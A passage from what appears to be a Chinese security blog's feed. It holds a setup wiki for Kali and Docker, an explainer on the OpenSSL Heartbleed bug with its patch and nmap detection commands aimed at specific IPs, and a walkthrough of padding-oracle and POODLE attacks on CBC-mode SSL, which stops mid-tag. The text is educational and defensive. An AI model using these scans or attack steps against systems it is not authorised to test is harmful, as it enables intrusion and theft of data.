title="安装kali"></a>安装kali</h2><p><a href="https://blog.csdn.net/qq_43645782/article/details/106190796">https://blog.csdn.net/qq_43645782/article/details/106190796</a></p><p>修改root密码</p><pre class="line-numbers language-bash"><code class="language-bash">root@m01ly:~<span class="token comment" spellcheck="true"># sudo passwd root</span>新的 密码：重新输入新的 密码：passwd：已成功更新密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="centos-安装AWVS"><a href="#centos-安装AWVS" class="headerlink" title="centos 安装AWVS"></a>centos 安装AWVS</h1><p><a href="https://blog.lfoder.cn/2020/06/04/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-AWVS-Nessus-Docker%E7%89%88/">https://blog.lfoder.cn/2020/06/04/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-AWVS-Nessus-Docker%E7%89%88/</a> </p><h1 id="centos-安装docker"><a href="#centos-安装docker" class="headerlink" title="centos 安装docker"></a>centos 安装docker</h1><p><img src="/2020/09/03/m01ly-wiki/1612343038903.png" alt="1612343038903"></p><h4 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p><pre><code>$ sudo yum remove docker \         docker-client \         docker-client-latest \         docker-common \         docker-latest \         docker-latest-logrotate \         docker-logrotate \         docker-engine</code></pre><h4 id="安装-Docker-Engine-Community"><a href="#安装-Docker-Engine-Community" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h4><p>可以选择国内的一些aliyun源地址：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum-config-manager \    --add-repo \    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="安装-Docker-Engine-Community-1"><a href="#安装-Docker-Engine-Community-1" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h4><p>安装最新版本的 Docker Engine-Community 和 containerd，或者转到下一步安装特定版本：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> yum <span class="token function">install</span> docker-ce docker-ce-cli containerd.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="启动-Docker。"><a href="#启动-Docker。" class="headerlink" title="启动 Docker。"></a>启动 Docker。</h4><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过运行 hello-world 映像来验证是否正确安装了 Docker Engine-Community 。</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> docker run hello-world<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/03/m01ly-wiki/1603272603871.png" alt="1603272603871"></p><h1 id="docker-访问宿主机目录"><a href="#docker-访问宿主机目录" class="headerlink" title="docker 访问宿主机目录"></a>docker 访问宿主机目录</h1><h2 id="挂载一个目录"><a href="#挂载一个目录" class="headerlink" title="挂载一个目录"></a>挂载一个目录</h2><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v <span class="token variable">$path_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path_in_docker</span> deep_sleepnet:1.0 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 执行之后，相当于把此数据目录挂载在对应docker的目录中，用  即可查看并访问所挂载数据。Dockerfile中最后一行运行相应的 </p><p>例如：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker run -it -m 4G -v /var/log/suricata:/mnt -p 5601:5601 -p 9200:9200 -p 5044:5044 sebp/elk: 638</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker ps -a</span>CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                                                              NAMES45a7bc7b174d        sebp/elk:623        <span class="token string">"/usr/local/bin/star…"</span>   13 hours ago        Up 12 hours         0.0.0.0:5044-<span class="token operator">></span>5044/tcp, 0.0.0.0:5601-<span class="token operator">></span>5601/tcp, 0.0.0.0:9200-<span class="token operator">></span>9200/tcp, 9300/tcp   charming_wu<span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker exec -it 45a7bc7b174d bash</span>root@45a7bc7b174d:/<span class="token comment" spellcheck="true"># ls</span>bd_build  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到宿主机文件夹mnt</p><p><img src="/2020/09/03/m01ly-wiki/1603765650364.png" alt="1603765650364"></p><h2 id="挂载两个目录"><a href="#挂载两个目录" class="headerlink" title="挂载两个目录"></a>挂载两个目录</h2><p>注意每个目录前都要加参数-v</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v <span class="token variable">$path_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path_in_docker</span> -v <span class="token variable">$path1_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path1_in_docker</span> deep_sleepnet:1.0 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="docker-compose命令不存在、未找到命令"><a href="#docker-compose命令不存在、未找到命令" class="headerlink" title="docker-compose命令不存在、未找到命令"></a>docker-compose命令不存在、未找到命令</h1><p>安装扩展源</p><pre><code>sudo yum -y install epel-release</code></pre><p>安装python-pip模块</p><pre><code>sudo yum install python-pip</code></pre><p>查看docker-compose版本,<strong>提示未找到命令</strong></p><pre><code>./docker-compose version</code></pre><p><img src="/2020/09/03/m01ly-wiki/1611136362318.png" alt="1611136362318"></p><p>通过以命令进行安装</p><pre><code>cd /usr/local/bin/wget https://github.com/docker/compose/releases/download/1.14.0-rc2/docker-compose-Linux-x86_64rename docker-compose-Linux-x86_64 docker-compose docker-compose-Linux-x86_64chmod +x /usr/local/bin/docker-compose./usr/local/bin/docker-compose versionsudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose#加个软连接docker-compose version</code></pre><p><img src="/2020/09/03/m01ly-wiki/1611136334326.png" alt="1611136334326"></p><p><img src="/2020/09/03/m01ly-wiki/1611136724260.png" alt="1611136724260"></p><p>卸载</p><pre><code>sudo rm /usr/local/bin/docker-compose</code></pre><p>升级</p><p><a href="https://github.com/docker/compose/releases/">查看最新版本</a>，选择版本复制链接即可。</p><p><img src="/2020/09/03/m01ly-wiki/1611137297043.png" alt="1611137297043"></p><pre><code>cd /usr/local/bin/wget https://github.com/docker/compose/releases/download/1.28.0/docker-compose-Linux-x86_64rename docker-compose-Linux-x86_64 docker-compose docker-compose-Linux-x86_64chmod +x /usr/local/bin/docker-compose./usr/local/bin/docker-compose versionsudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose#加个软连接docker-compose version</code></pre><h1 id="wps打开CSV乱码"><a href="#wps打开CSV乱码" class="headerlink" title="wps打开CSV乱码"></a>wps打开CSV乱码</h1><p>（1）使用记事本打开CSV文件</p><p>（2）点击菜单：文件-另存为，编码方式选择ANSI</p><h1 id="kali安装pip"><a href="#kali安装pip" class="headerlink" title="kali安装pip"></a>kali安装pip</h1><p><a href="https://www.cnblogs.com/fzblog/p/12940714.html">https://www.cnblogs.com/fzblog/p/12940714.html</a></p><h1 id="CentOS-7升级Python到3-5后yum出错"><a href="#CentOS-7升级Python到3-5后yum出错" class="headerlink" title="CentOS 7升级Python到3.5后yum出错"></a><a href="https://www.cnblogs.com/linkxu1989/p/6955137.html">CentOS 7升级Python到3.5后yum出错</a></h1><p>solution:将下面两个文件的开头改为从!/usr/bin/python 改成!/usr/bin/python2.7 </p><pre><code>vi /usr/bin/yumvi /usr/libexec/urlgrabber-ext-down  </code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>TLS攻击之心脏滴血</title>
      <link href="/2020/09/03/htps-attack-heartbleed/"/>
      <url>/2020/09/03/htps-attack-heartbleed/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一-心脏滴血介绍"><a href="#一-心脏滴血介绍" class="headerlink" title="一 心脏滴血介绍"></a>一 心脏滴血介绍</h1><p> <strong>心脏滴血漏洞(CVE-2014-0160)</strong> 是一个出现在加密程序库OpenSSL的安全漏洞，openssl是用于实现TLS协议的库。</p><p><strong>受影响的版本：</strong> OpenSSL1.0.1、1.0.1a 、1.0.1b 、1.0.1c 、1.0.1d 、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等版本 </p><p><strong>影响范围</strong>：只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可能因此而受到攻击。 因为缺陷在于OpenSSL的实现，而不是SSL/TLS协议本身，所以除了OpenSSL之外的其他TLS实现方式，如GnuTLS、Mozilla的网络安全服务（NSS）和Windows平台的TLS实现都不受影响。</p><p><strong>漏洞原理：</strong>在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查，因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过读，即可以读取的数据比应该允许读取的还多 。</p><a id="more"></a><h1 id="二-漏洞原理分析"><a href="#二-漏洞原理分析" class="headerlink" title="二 漏洞原理分析"></a>二 漏洞原理分析</h1><h2 id="2-1-心跳机制"><a href="#2-1-心跳机制" class="headerlink" title="2.1 心跳机制"></a>2.1 心跳机制</h2><p> TLS / SSL协议的一个重要组成部分被称为“心跳”。从本质上讲，<strong>心跳就是两台电脑互相通信从而让对方知道它们仍然相连，即使用户没有下载或上传任何东西。</strong></p><p><strong>（1） 正常心跳检测</strong></p><p>每过一段时间，浏览器会发送一个加密的数据到服务器端，这被称为心跳请求，至关重要的是，心跳请求里包含自己的长度信息。例如下图中，</p><p><strong>客户端：</strong>内容为abcdefghij,，自己的长度为10字节 。</p><p><strong>服务器</strong>：收到消息时，会分配一个内存缓冲区（一个物理内存区域用以存储信息），该区域的存储空间和心跳请求信号里的长度一致，即10字节。接下来，它会存储请求信号的加密数据到内存缓冲区，然后读取数据并将其发送回你的浏览器，来证明连接仍然存在。</p><p><img src="/2020/09/03/htps-attack-heartbleed/1599116465905.png" alt="1599116465905"></p><p><strong>（2） 心脏滴血</strong></p><p> 心脏出血漏洞的出现是因为，**OpenSSL的心跳功能缺少了一个至关重要的安全维护手段：计算机接受心跳请求时从不检查该请求和它声称的内容是否一致，及从不检查所请求的数据长度是否和声称的数据长度一致，导致响应方返回额外长度的数据，具体如下图所示：</p><p><strong>客户端心跳请求：</strong>abcdefghij,，心跳长度为10字节 。</p><p><strong>服务器端：</strong>接收心跳数据后，没有对心跳请求数据长度和声称 的10字节长度进行检查，直接分配200字节缓存区，存储心跳数据。返回数据时，从缓冲区读取200字节的数据返回给客户端。这时候缓冲区可能会存在密钥，用户名，密码等隐私信息（可想而知payload需要精心构造以读取有用的隐私信息，这里仅仅简单描述攻击原理）。</p><p><img src="/2020/09/03/htps-attack-heartbleed/1599117066503.png" alt="1599117066503"></p><h2 id="2-2-心脏出血错误代码"><a href="#2-2-心脏出血错误代码" class="headerlink" title="2.2 心脏出血错误代码"></a>2.2 心脏出血错误代码</h2><p>导致心脏出血漏洞的编程错误可以归于一行代码：</p><pre><code>memcpy(bp, pl, payload);</code></pre><p>memcpy()是复制数据的命令。bp是被复制的数据的存储区域，pl是被复制的数据的来源，payload是被复制的数据长度。<strong>问题在于，该命令没有检验pl复制的数据是否和payload给予的长度相符。</strong></p><h1 id="3-修复心脏滴血漏洞"><a href="#3-修复心脏滴血漏洞" class="headerlink" title="3 修复心脏滴血漏洞"></a>3 修复心脏滴血漏洞</h1><p>修补心脏出血漏洞的方式是更新最新的OpenSSL版本，你可以在官网上获取相关链接 <a href="https://www.openssl.org/source/">https://www.openssl.org/source/</a> 。</p><p>因为OpenSSL是开源的，以下是<strong>修复过的代码</strong>： 代码的第一部分的功能是确定心跳请求的大小不是0KB，不然可能会出错。第二部分用来检验心跳的长度是否和它声称的相符。 </p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">*</span> Read type <span class="token operator">and</span> payload length first<span class="token operator">*</span><span class="token operator">/</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">></span> s<span class="token operator">-</span><span class="token operator">></span>s3<span class="token operator">-</span><span class="token operator">></span>relent<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">/</span>silently discard <span class="token operator">*</span><span class="token operator">/</span>hbtype <span class="token operator">=</span> <span class="token operator">*</span>p<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">;</span>n2s<span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">></span> s<span class="token operator">-</span><span class="token operator">></span>s3<span class="token operator">-</span><span class="token operator">></span>rrec<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">/</span> silently discard per RFC <span class="token number">6520</span> sec<span class="token punctuation">.</span> <span class="token number">4</span> <span class="token operator">*</span><span class="token operator">/</span>pl <span class="token operator">=</span> p<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-心脏滴血漏洞检测"><a href="#4-心脏滴血漏洞检测" class="headerlink" title="4  心脏滴血漏洞检测"></a>4  心脏滴血漏洞检测</h1><h2 id="4-1-nmap"><a href="#4-1-nmap" class="headerlink" title="4.1  nmap"></a>4.1  nmap</h2><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 443 --script ssl-heartbleed 66.175.219.225或者nmap -sV --script<span class="token operator">=</span>ssl-heartbleed 111.X.X.53 -p 443<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其他检测TLS工具也可检测，具体见：<a href="https://m01ly.github.io/2020/08/26/htps-tools/">TLS检测小工具</a> </p><h2 id="4-2-网上在线检测"><a href="#4-2-网上在线检测" class="headerlink" title="4.2 网上在线检测"></a>4.2 网上在线检测</h2><p> <a href="http://possible.lv/tools/hb/">http://possible.lv/tools/hb/</a> </p><p> <a href="http://filippo.io/Heartbleed/">http://filippo.io/Heartbleed/</a> </p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>1  <a href="https://www.aqniu.com/news-views/28453.html">https://www.aqniu.com/news-views/28453.html</a>   通俗易懂</p><p>2 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</a>  漏洞详情</p><p>3 <a href="https://blog.csdn.net/yaofeiNO1/article/details/54428021">https://blog.csdn.net/yaofeiNO1/article/details/54428021</a>  可利用的payload</p><p>4 <a href="https://www.cnblogs.com/KevinGeorge/p/8029947.html">https://www.cnblogs.com/KevinGeorge/p/8029947.html</a>   POC</p><p>5<a href="https://zh.wikipedia.org/wiki/%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E">https://zh.wikipedia.org/wiki/%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E</a>  wiki</p>]]></content>
      
      
      
        <tags>
            
            <tag> TLS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TLS 攻击之POODLE</title>
      <link href="/2020/09/01/htps-attack-paddingoracle/"/>
      <url>/2020/09/01/htps-attack-paddingoracle/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>转载 <a href="http://www.bewindoweb.com/272.html%EF%BC%8C%E5%85%B7%E4%BD%93%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90%EF%BC%8C%E5%86%99%E7%9A%84%E5%BE%88%E5%A5%BD%EF%BC%8C%E7%84%B6%E5%90%8E%E6%96%87%E7%AB%A0%E6%88%91%E5%8A%A0%E5%85%A5%E4%BA%86%E8%87%AA%E5%B7%B1%E7%9A%84%E7%90%86%E8%A7%A3%E3%80%82">http://www.bewindoweb.com/272.html，具体实例分析，写的很好，然后文章我加入了自己的理解。</a></p><a id="more"></a><h2 id="一、-POODLE简介"><a href="#一、-POODLE简介" class="headerlink" title="一、 POODLE简介"></a>一、 POODLE简介</h2><p>2014年9月Google的一份研究报告<a href="https://www.openssl.org/~bodo/ssl-poodle.pdf">《This POODLE Bites: Exploiting The SSL 3.0 Fallback》</a>指出，SSL存在安全漏洞CVE­-2014-3566，代号为POODLE（Padding Oracle On Downgraded Legacy Encryption，基于降级旧加密协议的填充提示），该漏洞可以使得攻击者获取到一段明文数据，比如HTTP的cookie。</p><p><strong>漏洞影响版本：</strong>SSL v3.0以下</p><p><strong>防御方法：</strong>完全禁用SSL，或者利用TLS_FALLBACK_SCSV字段禁止协议降级到SSL</p><h1 id="二、Padding-Oracle-攻击原理"><a href="#二、Padding-Oracle-攻击原理" class="headerlink" title="二、Padding Oracle 攻击原理"></a>二、Padding Oracle 攻击原理</h1><p>Padding Oracle是Web程序渗透的经典攻击方式，由Juliano Rizzo和Thai Duong于2010年<a href="http://netifera.com/research/">《Practical Padding Oracle Attacks》</a>提出，该攻击利用CBC（Cipher-block chaining，密码块链接模式）加密模式中的填充漏洞给出的提示信息逐步推导出明文数据。</p><h2 id="2-1-CBC密码块链接模式——加密"><a href="#2-1-CBC密码块链接模式——加密" class="headerlink" title="2.1 CBC密码块链接模式——加密"></a><strong>2.1 CBC密码块链接模式——加密</strong></h2><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950607286.png" alt="1598950607286"></p><p>（1）对明文进行分组，每组长度相同（一般为8字节或16字节），对长度不足的分组需要进行填充（Padding）。</p><p>填充通常遵循的是PKCS5标准，即填充的字符是需要填充字符的个数。</p><p>例如，这里的明文字符串为“GET /a HTTP/1.1\r”，那么按ASCII的十六进制就可以表示为：</p><ul><li>第一组明文：“0x47、0x45、0x54、0x20、0x2F、0x61、0x20、0x48”</li><li>第二组明文：“0x54、0x54、0x50、0x2F、0x31、0x2E、0x31、0x0D”</li></ul><p>假设后面还有字符不能构成8字节的一组，那么需要进行填充，例如（前面字符没有用十六进制表示）：</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950619500.png" alt="1598950619500"></p><p>当然，一般不会有全填充的组。</p><p>（2）随机生成一个初始化向量IV，与第一个明文分组进行异或运算得到中间值（Intermediary Value）。</p><p>例如这里随机生成的IV为“0x01、0x02、0x03、0x04、0x05、0x06、0x07、0x08”，与第一个分组“0x47、0x45、0x54、0x20、0x2F、0x61、0x20、0x48”进行异或后得到“0x46、0x47、0x57、0x24、0x2A、0x67、0x27、0x40”。</p><p>（3）将异或结果进行加密，得到第一个明文分组的密文。</p><p>一般会使用密钥（key）加密，这里简单假设密钥加密效果等同于加密函数y = f(x) = x + 1，那么可以得到第一组密文“0x47、0x48、0x58、0x25、0x2B、0x68、0x28、0x41”。</p><p>（4）从第二个明文分组开始，将上一组密文当作IV，进行异或运算，再进行加密，得到该组密文。</p><p>例如这里由第一组密文“0x47、0x48、0x58、0x25、0x2B、0x68、0x28、0x41”与第二组明文“0x54、0x54、0x50、0x2F、0x31、0x2E、0x31、0x0D”进行异或，得到“0x13、0x1C、0x08、0x0A、0x1A、0x46、0x19、0x4C”，再进行相同加密，得到“0x14、0x1D、0x09、0x0B、0x1B、0x47、0x1A、0x4D”，这就是第二组密文。</p><h2 id="2-2-CBC密码块链接模式——解密"><a href="#2-2-CBC密码块链接模式——解密" class="headerlink" title="2.2 CBC密码块链接模式——解密"></a><strong>2.2 CBC密码块链接模式——解密</strong></h2><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950639436.png" alt="1598950639436"></p><p>加密的IV是随机生成的，而解密则必须使用这个IV。</p><p>（1）对密文进行分组，每组长度相同（一般为8字节或16字节）。</p><p>例如这里将密文分为了两组：</p><ul><li>第一组密文：“0x47、0x48、0x58、0x25、0x2B、0x68、0x28、0x41”</li><li>第二组密文：“0x14、0x1D、0x09、0x0B、0x1B、0x47、0x1A、0x4D”</li></ul><p>（2）对密文进行解密，得到中间值。</p><p>一般使用密钥，同样的这里假设密钥效果等同于函数x = f(y) = y - 1</p><ul><li>第一组中间值：“0x46、0x47、0x57、0x24、0x2A、0x67、0x27、0x40”</li><li>第二组中间值：“0x13、0x1C、0x08、0x0A、0x1A、0x46、0x19、0x4C”</li></ul><p>（3）使用初始化向量IV，与第一个分组进行异或运算得到第一组明文。</p><p>这是利用异或的性质：a⊕b=c，a⊕c=b，b⊕c=a，所以无论如何异或都能得到唯一的第三个数。</p><p>例如这里IV为“0x01、0x02、0x03、0x04、0x05、0x06、0x07、0x08”，第一个数0x01与第一组第一个中间值0x46异或结果为0x47，就是明文“G”的ASCII十六进制表示，于是得到第一组明文“0x47、0x45、0x54、0x20、0x2F、0x61、0x20、0x48”</p><p>（4）从第二组开始，依次将前一组密文和该组中间值异或，得到该组明文。</p><p>例如第一组密文“0x47、0x48、0x58、0x25、0x2B、0x68、0x28、0x41”和第二组中间值“0x13、0x1C、0x08、0x0A、0x1A、0x46、0x19、0x4C”异或得到第二组明文“0x54、0x54、0x50、0x2F、0x31、0x2E、0x31、0x0D”。</p><p>值得注意的是，<strong>解密可以并行计算，因为密文都是已经获取好的</strong>；加密则不行，因为前一组密文必须要计算出来。</p><h2 id="2-3-Padding-Oracle-攻击"><a href="#2-3-Padding-Oracle-攻击" class="headerlink" title="2.3 Padding Oracle 攻击"></a><strong>2.3 Padding Oracle 攻击</strong></h2><h4 id="2-3-1-攻击原理"><a href="#2-3-1-攻击原理" class="headerlink" title="2.3.1 攻击原理"></a>2.3.1 攻击原理</h4><p><img src="/2020/09/01/htps-attack-paddingoracle/1599017277323.png" alt="1599017277323"></p><p><strong>攻击最终原理：</strong></p><p><strong>目标：</strong>已知IV，密文。求中间值。</p><p><strong>方法：</strong></p><p>通过逐字节伪造IV使得：<br>$$<br>伪造IV+中间值=0x01(明文)<br>$$<br>（因为服务器端会进行padding校验，回显成功与否，这里用的padding是pkcs#5）</p><p>然后利用：<br>$$<br>0x01(明文)+真实IV=中间值<br>$$<br>即可求得中间值，从而通过下列等式求得明文。<br>$$<br>真实IV+中间值=明文<br>$$</p><h4 id="2-3-2-攻击过程"><a href="#2-3-2-攻击过程" class="headerlink" title="2.3.2 攻击过程"></a>2.3.2 攻击过程</h4><hr><p>首先请注意，始终在字符串的末尾附加至少一个填充字节，因此将使用0x01填充7字节的值（如AVOCADO），而将8字节的值（如PLANTAIN）具有向其中添加了完整的填充块。填充字节的值还指示字节数，因此逻辑上最后一个密文块末尾的逻辑最终值必须是：</p><ul><li>单个0x01字节（0x01）</li><li>两个0x02字节（0x02、0x02）</li><li>三个0x03字节（0x03、0x03、0x03）</li><li>四个0x04字节（0x04、0x04、0x04、0x04）</li><li>…等等</li></ul><p><strong>如果最终的解密块未以这些有效字节序列之一结尾，则大多数密码提供程序将抛出无效的填充异常。引发此异常的事实对于攻击者（我们）而言至关重要，因为它是填充预言攻击的基础</strong>。</p><p>现在构造一个场景：假设密文仍然是上述字段“GET /a HTTP/1.1\r”，且用户连接到的是公共WIFI，攻击者可以通过抓包获取CBC密文以及初始化向量IV（当然要把IV明文传给服务器否则服务器无法解密第一个分组）。</p><p>我们现在希望通过密文和IV获取明文，由于“IV⊕中间值=明文”，问题转变为如何求IV对应的中间值。</p><p>我们知道，对大多数Web服务器而言：</p><ul><li><p>收到有效的密文（正确填充并包含有效数据的密文）后，应用程序将正常响应（200 OK）</p></li><li><p>收到无效的密文（解密后不会以有效填充结尾）时，应用程序将引发加密异常（500 Internal Server Error）</p></li><li><p><em>收到有效的密文（正确填充的密文）但解密为无效值时，应用程序将显示自定义错误消息（200 OK）</em></p><p>上面描述的场景是经典的Padding Oracle，因为我们可以使用应用程序的行为轻松确定提供的加密值是否正确填充。术语oracle是指可以用来确定测试通过还是失败的机制。</p><p>IV出现在解密的最后一步，而且是可以构造的，那么攻击者可以通过构造特殊的IV，直到符合“填充”规则通过解密流程（虽然不一定能通过数据合法性校验），具体而言：</p></li></ul><p>（1）构造“0x00、0x00、0x00、0x00、0x00、0x00、0x00、0x00”的特殊IV发送给服务端，不断尝试递增最后一位并发送给服务端，直到服务端解密成功。</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950652145.png" alt="1598950652145"></p><p>此时必然产生了1位填充（因为我们已经知道IV是0x01、0x02、0x03、0x04、0x05、0x06、0x07、0x08），最多尝试次数为256次。（<strong>这里最后一位必须为01才可以通过服务器的padding校验，因为采用的是PKCS5标准填充</strong>）</p><p>（2）计算出末位中间值，其值等于伪造向量末位异或0x01：0x41⊕0x01=0x40</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950673196.png" alt="1598950673196"></p><p>（3）利用原始向量末位值异或中间值，得到明文0x48，即字符“H”：0x40⊕0x08=0x48</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950689577.png" alt="1598950689577"></p><p>（4）利用中间值计算出末位为0x02的伪造向量应有值：0x40⊕0x02=0x42</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950705091.png" alt="1598950705091"></p><p>（5）通过改变倒数第二位，直到生成0x020x02的末位明文填充字符，符合2位填充规则，然后类似地推测倒数第二位的中间值：</p><p><img src="http://cdn.bewindoweb.com/uploadpic/9a93974acc1def3a2247974deb3a6392.jpeg" alt="img"></p><p>重复上述步骤，就能够得到完整的明文信息，这就是Padding Oracle 填充提示攻击。</p><h1 id="三、POODLE攻击原理"><a href="#三、POODLE攻击原理" class="headerlink" title="三、POODLE攻击原理"></a>三、POODLE攻击原理</h1><h2 id="3-1-SSLv3-0存在的问题"><a href="#3-1-SSLv3-0存在的问题" class="headerlink" title="3.1 SSLv3.0存在的问题"></a><strong>3.1 SSLv3.0存在的问题</strong></h2><p>SSLv3.0的记录层可以使用如下加密方式：</p><table><thead><tr><th align="left">加密类型</th><th align="left">加密方式</th></tr></thead><tbody><tr><td align="left">块加密 Block Cipher</td><td align="left">IDEA</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">RC2-40</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">DES-40</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">DES</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">3DES</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">FORTEZZA</td></tr><tr><td align="left">流加密 Stream Cipher</td><td align="left">RC-40</td></tr><tr><td align="left">流加密 Stream Cipher</td><td align="left">RC4-128</td></tr></tbody></table><p>流加密这里不讨论，也是有安全问题，主要讨论CBC块加密。</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598952050289.png" alt="1598952050289"></p><p>SSL记录层加密的是原始数据+MAC（消息验证码）信息摘要+填充字节，MAC一般是Hash值，SSLv3.0中MAC通常为20字节。也就是说，SSL先对数据做完整性校验，再进行CBC加密。在CBC解密的一端（服务器），SSL没有规定padding填充块字节内容，只校验填充块最后一个字节，该字节为填充长度，然后去掉填充的字符，再进行MAC验证，最后获得明文数据。</p><ul><li>先校验完整性，再加密，使得对端收到数据后先解密，后校验完整性，解密是否成功为攻击提供了判断依据；</li><li>只验证填充块的最后一个字节，因此填充块可以填充任意字符，且最后字符固定使得攻击者可以利用类似Padding Oracle的攻击机制。</li></ul><p>我们可以利用类似前面Padding Oracle的思路，将要解密的字符放到最后一个块末尾，不断地调整前一个IV的值（可能是初始化向量，也可能是前一段的密文，并且无论是哪个攻击者都是知道的），直到成功通过解密，此时明文必定为0x07或0x15（16字节一块的话）（因为需要填充一整块），最多尝试256次（或512次），就能够通过服务器验证，从而推导出对应的中间值，然后利用该中间值和IV推导出明文。这期间不用担心修改IV导致MAC校验失败，因为那是CBC解密之后的事情。</p><h2 id="3-2-利用SSL漏洞进行POODLE攻击"><a href="#3-2-利用SSL漏洞进行POODLE攻击" class="headerlink" title="3.2 利用SSL漏洞进行POODLE攻击"></a><strong>3.2 利用SSL漏洞进行POODLE攻击</strong></h2><p>假设攻击者B代理了客户端A的HTTPS访问服务器C的请求，可以截获到SSL密文数据以及SSL握手阶段的IV，且可以通过A去发送HTTPS请求，此时如果A没有退出登录，都会自动携带上Cookie。这样，B可以控制A发送的HTTP请求中的请求路径Path和请求体Body，并通过调整Path和Body，让A发出的请求满足两个条件：</p><ul><li>填充字段恰好填充了一个块长度</li><li>Cookie的第一个未知字符刚好出现在前面某个块的末尾</li></ul><p>例如，加密采用3DES，8字节一个块，且SSL上层为HTTP协议，发送的明文为：</p><pre class="line-numbers language-html"><code class="language-html">GET / HTTP/1.1\r\nCookie: abcdefgh \r\n\r\nXXXX MAC数据 XXXXXX7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 